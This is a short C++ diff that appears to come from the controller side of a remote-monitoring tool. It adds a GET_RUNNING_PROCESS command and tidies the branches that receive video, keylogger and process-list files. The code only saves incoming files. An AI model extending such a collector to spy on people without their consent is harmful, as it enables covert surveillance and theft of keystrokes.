@@ -18,13 +18,17 @@ int main()
         {
             client.ReceiveFile("../data/copyfile");
         }
-        if (com == "GET_VIDEO")
+        else if (com == "GET_VIDEO")
         {
             client.ReceiveFile("../data/video");
         }
         else if(com == "GET_KEYLOGGER")
         {
             client.ReceiveFile("../data/keylogger");
+        }
+        else if(com == "GET_RUNNING_PROCESS")
+        {
+            client.ReceiveFile("../data/process");
         }
     }
 
